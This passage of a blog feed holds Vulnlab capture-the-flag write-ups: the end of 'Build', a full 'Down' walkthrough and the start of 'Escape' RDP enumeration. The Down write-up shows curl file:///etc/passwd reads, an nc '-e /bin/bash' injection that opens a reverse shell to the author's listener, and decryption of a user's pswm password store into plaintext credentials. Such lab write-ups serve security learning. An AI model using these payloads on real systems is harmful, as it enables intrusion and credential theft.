10.10.107.157</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Expanded Security Maintenance <span class="keyword">for</span> Applications is not enabled.</span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line">Enable ESM Apps to receive additional future security updates.</span><br><span class="line">See https://ubuntu.com/esm or run: <span class="built_in">sudo</span> pro status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: <span class="built_in">sudo</span> apt update</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">root@build:~# <span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@build:~# <span class="built_in">ls</span></span><br><span class="line">root.txt  scripts  snap</span><br><span class="line">root@build:~# <span class="built_in">cat</span> root.txt</span><br><span class="line">VL&#123;**********&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-build/build-pwn.png"
                      alt="pwn"
                ></p>
]]></content>
      <tags>
        <tag>Vulnlab</tag>
        <tag>Easy</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnlab-Down</title>
    <url>/2025/01/28/Vulnlab-Down/</url>
    <content><![CDATA[<h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>simple nmap scan</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>nmap</span></figcaption><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 19:43 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.120.182</span><br><span class="line">Host is up (0.31s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 22.62 seconds</span><br></pre></td></tr></table></figure></div>
<p>On <code>port 80</code>, the website shows a page with status checking function which seems to be using <code>cURL</code>.<br><br></p>
<p>By providing the URL link towards my python server, it reaches out to it.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-down/first-encounter.png"
                      alt="testing-the-website"
                ></p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>simple server</span></figcaption><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ serv</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.120.182 - - [25/Jan/2025 19:46:45] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure></div>
<br>

<p>Curling for localhost also works<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-down/localhost.png"
                      alt="localhost"
                ></p>
<hr>

<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>From <code>Unix &amp; Linux</code> (<a class="link"   href="https://unix.stackexchange.com/questions/648144/how-to-use-curl-to-get-a-file-from-a-specific-directory" >https://unix.stackexchange.com/questions/648144/how-to-use-curl-to-get-a-file-from-a-specific-directory<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>), learn that <code>cURL</code> can be used to read specific files via <code>curl file:///etc/passwd</code></p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>curl</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">#demo</span></span><br><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ curl file:///etc/passwd | grep muyi</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  3615  100  3615    0     0  11.5M      0 --:--:-- --:--:-- --:--:-- 3530k</span><br><span class="line">muyi:x:1000:1000:,,,:/home/muyi:/bin/bash</span><br></pre></td></tr></table></figure></div>

<p>Expanding the command so that it contains <code>http/https</code> as per requested by the website, it will look like this</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>cURL for http + etc/passwd</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># demo</span></span><br><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ curl http://10.8.5.50:8000 file:///etc/passwd</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Directory listing <span class="keyword">for</span> /&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Directory listing <span class="keyword">for</span> /&lt;/h1&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">... web content goes here ...</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">... more to go ...</span><br><span class="line">muyi:x:1000:1000:,,,:/home/muyi:/bin/bash</span><br><span class="line">... more to go ...</span><br></pre></td></tr></table></figure></div>
<br>

<p>using this concept, exploit the website.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ curl -X <span class="string">&#x27;POST&#x27;</span> <span class="string">&quot;http://<span class="variable">$ip</span>&quot;</span> -d <span class="string">&quot;url=http://127.0.0.1+file:///etc/passwd&quot;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Is it down or just me?&lt;/title&gt;</span><br><span class="line">    &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">... <span class="built_in">source</span> of web page ...</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">... more <span class="keyword">in</span> between ...</span><br><span class="line"></span><br><span class="line">aleks:x:1000:1000:Aleks:/home/aleks:/bin/bash</span><br><span class="line">lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">... more below ...</span><br></pre></td></tr></table></figure></div>
<p>notice there’s user <code>aleks</code>, this can be useful onwards</p>
<p>After enumerating quite a files, reviewing back the <code>index.php</code> for the php code</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ( isset($_GET[&#x27;expertmode&#x27;]) &amp;&amp; $_GET[&#x27;expertmode&#x27;] === &#x27;tcp&#x27; ) &#123;</span><br><span class="line">  echo &#x27;&lt;h1&gt;Is the port refused, or is it just you?&lt;/h1&gt;</span><br><span class="line">        &lt;form id=&quot;urlForm&quot; action=&quot;index.php?expertmode=tcp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; id=&quot;url&quot; name=&quot;ip&quot; placeholder=&quot;Please enter an IP.&quot; required&gt;&lt;br&gt;</span><br><span class="line">            &lt;input type=&quot;number&quot; id=&quot;port&quot; name=&quot;port&quot; placeholder=&quot;Please enter a port number.&quot; required&gt;&lt;br&gt;</span><br><span class="line">            &lt;button type=&quot;submit&quot;&gt;Is it refused?&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo &#x27;&lt;h1&gt;Is that website down, or is it just you?&lt;/h1&gt;</span><br><span class="line">        &lt;form id=&quot;urlForm&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;url&quot; id=&quot;url&quot; name=&quot;url&quot; placeholder=&quot;Please enter a URL.&quot; required&gt;&lt;br&gt;</span><br><span class="line">            &lt;button type=&quot;submit&quot;&gt;Is it down?&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( isset($_GET[&#x27;expertmode&#x27;]) &amp;&amp; $_GET[&#x27;expertmode&#x27;] === &#x27;tcp&#x27; &amp;&amp; isset($_POST[&#x27;ip&#x27;]) &amp;&amp; isset($_POST[&#x27;port&#x27;]) ) &#123;</span><br><span class="line">  $ip = trim($_POST[&#x27;ip&#x27;]);</span><br><span class="line">  $valid_ip = filter_var($ip, FILTER_VALIDATE_IP);</span><br><span class="line">  $port = trim($_POST[&#x27;port&#x27;]);</span><br><span class="line">  $port_int = intval($port);</span><br><span class="line">  $valid_port = filter_var($port_int, FILTER_VALIDATE_INT);</span><br><span class="line">  if ( $valid_ip &amp;&amp; $valid_port ) &#123;</span><br><span class="line">    $rc = 255; $output = &#x27;&#x27;;</span><br><span class="line">    $ec = escapeshellcmd(&quot;/usr/bin/nc -vz $ip $port&quot;);</span><br><span class="line">    exec($ec . &quot; 2&gt;&amp;1&quot;,$output,$rc);</span><br><span class="line">    echo &#x27;&lt;div class=&quot;output&quot; id=&quot;outputSection&quot;&gt;&#x27;;</span><br><span class="line">    if ( $rc === 0 ) &#123;</span><br><span class="line">      echo &quot;&lt;font size=+1&gt;It is up. It&#x27;s just you! 😝&lt;/font&gt;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">      echo &#x27;&lt;p id=&quot;outputDetails&quot;&gt;&lt;pre&gt;&#x27;.htmlspecialchars(implode(&quot;\n&quot;,$output)).&#x27;&lt;/pre&gt;&lt;/p&gt;&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &quot;&lt;font size=+1&gt;It is down for everyone! 😔&lt;/font&gt;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">      echo &#x27;&lt;p id=&quot;outputDetails&quot;&gt;&lt;pre&gt;&#x27;.htmlspecialchars(implode(&quot;\n&quot;,$output)).&#x27;&lt;/pre&gt;&lt;/p&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &#x27;&lt;div class=&quot;output&quot; id=&quot;outputSection&quot;&gt;&#x27;;</span><br><span class="line">    echo &#x27;&lt;font color=red size=+1&gt;Please specify a correct IP and a port between 1 and 65535.&lt;/font&gt;&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; elseif (isset($_POST[&#x27;url&#x27;])) &#123;</span><br><span class="line">  $url = trim($_POST[&#x27;url&#x27;]);</span><br><span class="line">  if ( preg_match(&#x27;|^https?://|&#x27;,$url) ) &#123;</span><br><span class="line">    $rc = 255; $output = &#x27;&#x27;;</span><br><span class="line">    $ec = escapeshellcmd(&quot;/usr/bin/curl -s $url&quot;);</span><br><span class="line">    exec($ec . &quot; 2&gt;&amp;1&quot;,$output,$rc);</span><br><span class="line">    echo &#x27;&lt;div class=&quot;output&quot; id=&quot;outputSection&quot;&gt;&#x27;;</span><br><span class="line">    if ( $rc === 0 ) &#123;</span><br><span class="line">      echo &quot;&lt;font size=+1&gt;It is up. It&#x27;s just you! 😝&lt;/font&gt;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">      echo &#x27;&lt;p id=&quot;outputDetails&quot;&gt;&lt;pre&gt;&#x27;.htmlspecialchars(implode(&quot;\n&quot;,$output)).&#x27;&lt;/pre&gt;&lt;/p&gt;&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &quot;&lt;font size=+1&gt;It is down for everyone! 😔&lt;/font&gt;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &#x27;&lt;div class=&quot;output&quot; id=&quot;outputSection&quot;&gt;&#x27;;</span><br><span class="line">    echo &#x27;&lt;font color=red size=+1&gt;Only protocols http or https allowed.&lt;/font&gt;&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
<p>From the output above, notice there is a hidden function known as <code>expertmode</code> which uses <code>tcp</code>, possibility in gaining reverse shell. Try to exploit it.</p>
<ol>
<li>set index.php to index.php?expertmode&#x3D;tcp</li>
<li>required IP and port number</li>
<li>setting up a listener</li>
</ol>
<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ curl -X <span class="string">&#x27;POST&#x27;</span> <span class="string">&quot;http://<span class="variable">$ip</span>/index.php?expertmode=tcp&quot;</span> -d <span class="string">&quot;ip=10.8.5.50&amp;port=9999&quot;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Is it down or just me?&lt;/title&gt;</span><br><span class="line">    &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;header&gt;</span><br><span class="line">        &lt;img src=<span class="string">&quot;/logo.png&quot;</span> alt=<span class="string">&quot;Logo&quot;</span>&gt;</span><br><span class="line">        &lt;h2&gt;Is it down or just me?&lt;/h2&gt;</span><br><span class="line">    &lt;/header&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=<span class="string">&quot;container&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Is the port refused, or is it just you?&lt;/h1&gt;</span><br><span class="line">        &lt;form <span class="built_in">id</span>=<span class="string">&quot;urlForm&quot;</span> action=<span class="string">&quot;index.php?expertmode=tcp&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">            &lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;url&quot;</span> name=<span class="string">&quot;ip&quot;</span> placeholder=<span class="string">&quot;Please enter an IP.&quot;</span> required&gt;&lt;br&gt;</span><br><span class="line">            &lt;input <span class="built_in">type</span>=<span class="string">&quot;number&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;port&quot;</span> name=<span class="string">&quot;port&quot;</span> placeholder=<span class="string">&quot;Please enter a port number.&quot;</span> required&gt;&lt;br&gt;</span><br><span class="line">            &lt;button <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span>&gt;Is it refused?&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;&lt;div class=<span class="string">&quot;output&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;outputSection&quot;</span>&gt;&lt;font size=+1&gt;It is up. It<span class="string">&#x27;s just you! 😝&lt;/font&gt;&lt;br&gt;&lt;br&gt;&lt;p id=&quot;outputDetails&quot;&gt;&lt;pre&gt;10.8.5.50: inverse host lookup failed: Unknown host</span></span><br><span class="line"><span class="string">(UNKNOWN) [10.8.5.50] 9999 (?) open&lt;/pre&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;footer&gt;© 2024 isitdownorjustme LLC&lt;/footer&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    ----------------------------- listener -----------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ penelope 9999 -i tun0</span></span><br><span class="line"><span class="string">[+] Listening for reverse shells on 10.8.5.50:9999</span></span><br><span class="line"><span class="string">➤  💀 Show Payloads (p) 🏠 Main Menu (m) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</span></span><br><span class="line"><span class="string">[-] Invalid shell from 10.10.120.182 🙄</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
<p>from here, I found out that the expertmode is just using TCP to test the status, once connected, it closes the connection. Therefore, try to expand the command to establish a shell.</p>
<p>After trying a few commands, this are the one working:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ curl -X <span class="string">&#x27;POST&#x27;</span> <span class="string">&quot;http://<span class="variable">$ip</span>/index.php?expertmode=tcp&quot;</span> -d <span class="string">&quot;ip=10.8.5.50&amp;port=9999+-e+/bin/bash&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    ----------------------------- listener -----------------------------</span><br><span class="line">                    </span><br><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ penelope 9999 -i tun0</span><br><span class="line">[+] Listening <span class="keyword">for</span> reverse shells on 10.8.5.50:9999</span><br><span class="line">➤  💀 Show Payloads (p) 🏠 Main Menu (m) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</span><br><span class="line">[-] Invalid shell from 10.10.120.182 🙄</span><br><span class="line">[-] Invalid shell from 10.10.120.182 🙄</span><br><span class="line">[-] Invalid shell from 10.10.120.182 🙄</span><br><span class="line">[+] Got reverse shell from 🐧 10.10.120.182 😍️ - Assigned SessionID &lt;4&gt;</span><br><span class="line">[+] Attempting to upgrade shell to PTY...</span><br><span class="line">[+] Shell upgraded successfully using /usr/bin/python3! 💪</span><br><span class="line">[+] Interacting with session [4], Shell Type: PTY, Menu key: F12</span><br><span class="line">[+] Logging to /home/muyi/.penelope/10.10.120.182/10.10.120.182.<span class="built_in">log</span> 📜</span><br><span class="line">www-data@down:/var/www/html$ <span class="built_in">ls</span></span><br><span class="line">index.php  logo.png  style.css  user_aeT1xa.txt</span><br><span class="line">www-data@down:/var/www/html$ <span class="built_in">cat</span> user_aeT1xa.txt</span><br><span class="line">VL&#123;********&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="pswm"><a href="#pswm" class="headerlink" title="pswm"></a>pswm</h3><p>Again, after enumerating for a while, notice that www-data for some reason, can access the directory of user <code>aleks</code> and found some interesting things.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@down:/home$ <span class="built_in">cd</span> aleks</span><br><span class="line">www-data@down:/home/aleks$ <span class="built_in">ls</span> -la</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 5 aleks aleks 4096 Sep 15 09:15 .</span><br><span class="line">drwxr-xr-x 3 root  root  4096 Sep 13 14:43 ..</span><br><span class="line">lrwxrwxrwx 1 aleks aleks    9 Sep  6 14:43 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 aleks aleks  220 Jan  6  2022 .bash_logout</span><br><span class="line">-rw-r--r-- 1 aleks aleks 3771 Jan  6  2022 .bashrc</span><br><span class="line">drwx------ 2 aleks aleks 4096 Sep  6 15:03 .cache</span><br><span class="line">drwxrwxr-x 3 aleks aleks 4096 Sep  6 14:45 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r-- 1 aleks aleks  807 Jan  6  2022 .profile</span><br><span class="line">drwx------ 2 aleks aleks 4096 Sep  6 14:42 .ssh</span><br><span class="line">-rw-r--r-- 1 aleks aleks    0 Sep 15 09:15 .sudo_as_admin_successful</span><br><span class="line"></span><br><span class="line">www-data@down:/home/aleks$ <span class="built_in">cd</span> .<span class="built_in">local</span></span><br><span class="line">www-data@down:/home/aleks/.local$ <span class="built_in">cd</span> share</span><br><span class="line">www-data@down:/home/aleks/.local/share$ <span class="built_in">cd</span> pswm/</span><br><span class="line"></span><br><span class="line">www-data@down:/home/aleks/.local/share/pswm$ file pswm</span><br><span class="line">pswm: ASCII text, with no line terminators</span><br><span class="line"></span><br><span class="line">www-data@down:/home/aleks/.local/share/pswm$ <span class="built_in">cat</span> pswm</span><br><span class="line">e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==www-data</span><br></pre></td></tr></table></figure></div>

<p>so what is pswm? It’s a simple password manager written in Python by referring to this <code>https://github.com/Julynx/pswm</code></p>
<p>Using the decrypt tool from [<a class="link"   href="https://github.com/repo4Chu/pswm-decoder/blob/main/pswm-decoder.py]" >https://github.com/repo4Chu/pswm-decoder/blob/main/pswm-decoder.py]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, make some modification to the file path of pswm and run it.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>pswm-decoder.py</span></figcaption><table><tr><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ python3 pswm-decryptor.py</span><br><span class="line">Password: flower</span><br><span class="line">Decoded text:</span><br><span class="line">pswm    aleks   flower</span><br><span class="line">aleks@down      aleks   1uY3w22uc-Wr&#123;xNHR~+E</span><br></pre></td></tr></table></figure></div>
<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>Using the cracked credentials, I can logged into <code>aleks</code>, which allows all privilege so I can escalate my privilege to root.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ ssh aleks@<span class="variable">$ip</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.120.182 (10.10.120.182)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:uq3+WwrPajXEUJC3CCuYMMlFTVM8CGYqMtGB9mI29wg.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.120.182<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">aleks@10.10.120.182&#x27;</span>s password:</span><br><span class="line">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-119-generic x86_64)</span><br><span class="line">Last login: Sun Sep 15 09:14:52 2024 from 10.8.0.101</span><br><span class="line">aleks@down:~$ <span class="built_in">whoami</span></span><br><span class="line">aleks</span><br><span class="line"></span><br><span class="line">aleks@down:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> aleks:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> aleks on down:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User aleks may run the following commands on down:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line"></span><br><span class="line">aleks@down:~$ <span class="built_in">sudo</span> su</span><br><span class="line">root@down:/home/aleks# <span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">root@down:/home/aleks# <span class="built_in">cd</span></span><br><span class="line">root@down:~# <span class="built_in">cat</span> root.txt</span><br><span class="line">VL&#123;********&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-down/down-pwn.png"
                      alt="pwn"
                ></p>
]]></content>
      <tags>
        <tag>Vulnlab</tag>
        <tag>Easy</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnlab-Escape</title>
    <url>/2025/01/28/Vulnlab-Escape/</url>
    <content><![CDATA[<h2 id="Initial-Recon"><a href="#Initial-Recon" class="headerlink" title="Initial Recon"></a>Initial Recon</h2><p>simple nmap scan</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>scan</span></figcaption><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/escape~10.10.88.71$ nmap <span class="variable">$ip</span> -sV -o nmap</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 20:13 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.88.71</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 999 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 26.14 seconds</span><br></pre></td></tr></table></figure></div>
<p>notice that port 3389 is open, which is the port for Remote Desktop Protocol(RDP) service.<br><br></p>
<p>Try to further enumerate on it via nmap</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>rdp-nmap-scan</span></figcaption><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/escape~10.10.88.71$ nmap <span class="variable">$ip</span> --script <span class="string">&quot;rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info&quot;</span> -p 3389 -o rdp-nmap</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 20:16 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.88.71</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line">| rdp-enum-encryption:</span><br><span class="line">|   Security layer</span><br><span class="line">|     CredSSP (NLA): SUCCESS</span><br><span class="line">|     CredSSP with Early User Auth: SUCCESS</span><br><span class="line">|     RDSTLS: SUCCESS</span><br><span class="line">|     SSL: SUCCESS</span><br><span class="line">|_  RDP Protocol Version: Unknown</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: ESCAPE</span><br><span class="line">|   NetBIOS_Domain_Name: ESCAPE</span><br><span class="line">|   NetBIOS_Computer_Name: ESCAPE</span><br><span class="line">|   DNS_Domain_Name: Escape</span><br><span class="line">|   DNS_Computer_Name: Escape</span><br><span class="line">|   Product_Version: 10.0.19041</span><br><span class="line">|_  System_Time: 2025-01-26T12:16:39+00:00</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.57 seconds</span><br></pre></td></tr></table></figure></div>
<p>Using the scripts, it checks for availability of encryption and DoS vulnerability and obtains NTLM Windows info.</p>
<blockquote>
<p>CredSSP (NLA):</p>
<ul>
<li>a security feature of Microsoft’s RDP that requires users to authenticate before establishing a remote session</li>
</ul>
</blockquote>
<hr>

<h3 id="xfreerdp"><a href="#xfreerdp" class="headerlink" title="xfreerdp"></a>xfreerdp</h3><p>Try to connect to it with <code>xfreerdp</code></p>
